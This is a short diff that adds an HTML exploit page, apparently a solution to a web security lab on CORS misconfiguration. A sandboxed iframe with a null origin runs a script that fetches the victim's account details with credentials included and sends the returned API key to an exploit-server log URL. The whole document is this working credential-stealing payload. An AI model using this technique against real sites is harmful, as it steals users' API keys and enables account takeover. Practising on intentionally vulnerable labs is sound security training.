@@ -1,0 +1,12 @@
+<iframe sandbox="allow-scripts" srcdoc="<script>
+    fetch('https://....web-security-academy.net/accountDetails', {
+        credentials: 'include'
+    })
+    .then(resp => resp.json())
+    .then(json => {
+        fetch(`https://exploit-....exploit-server.net/log/${json.apikey}`, {
+            mode: 'no-cors'
+        });
+    });
+</script>">
+</iframe>
